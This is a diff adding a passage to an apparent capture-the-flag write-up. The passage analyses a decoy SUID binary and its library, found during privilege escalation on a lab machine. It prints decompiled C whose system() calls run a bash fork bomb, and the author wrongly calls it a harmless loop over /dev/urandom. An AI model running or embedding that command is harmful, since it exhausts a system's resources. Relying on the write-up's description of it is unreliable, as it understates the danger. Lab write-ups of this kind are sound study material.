@@ -156,8 +156,53 @@ I uploaded linpeas to the box and after running it I found this interesting
 From the result of the scan we can tell that:
 
 ```
-1. One possible way of escalating privilege to root is by exploiting that lxd group perm
-2. Checking the suid binaries
+1. One possible way of escalating privilege to root is by performing kernel exploitation 
+2. Checking the suid binary
 ```
 
 Lets start with the SUID binary first. I uploaded it to my machine for further analysis
+
+After I decompiled it using ghidra and viewing the main function here's what it gave
+
+```c
+undefined8 main(void)
+
+{
+  puts("Root Shell Initialized...");
+  sleep(2);
+  puts("Exploiting kernel at super illuminal speeds...");
+  sleep(1);
+  puts("Getting Root...");
+  sleep(3);
+  foo();
+  return 0;
+}
+```
+
+The foo function resides in the libcfoo.so file which can be gotten from the box and downloaded to our machine
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/ce31e42b-ebb7-4d96-9c5b-d4f4be9ef22b)
+
+After uploading it to my machine and decompiling it here's the function
+
+```c
+void foo(void)
+
+{
+  puts("Bwahaha, You just stepped into a booby trap XP");
+  sleep(2);
+  system("sleep 2 && func(){func|func& cat /dev/urandom &};func");
+  system("sleep 2 && func(){func|func& cat /dev/urandom &};func");
+  system("sleep 2 && func(){func|func& cat /dev/urandom &};func");
+  system("sleep 2 && func(){func|func& cat /dev/urandom &};func");
+  system("sleep 2 && func(){func|func& cat /dev/urandom &};func");
+  return;
+}
+```
+
+We see it's just a loop that runs *cat /dev/urandom* each 2 seconds
+
+So nothing really is worth it in this binary
+
+Lets move on with privilege escalation via lxd
+
+Here's the link to the [resource](https://www.hackingarticles.in/lxd-privilege-escalation/)
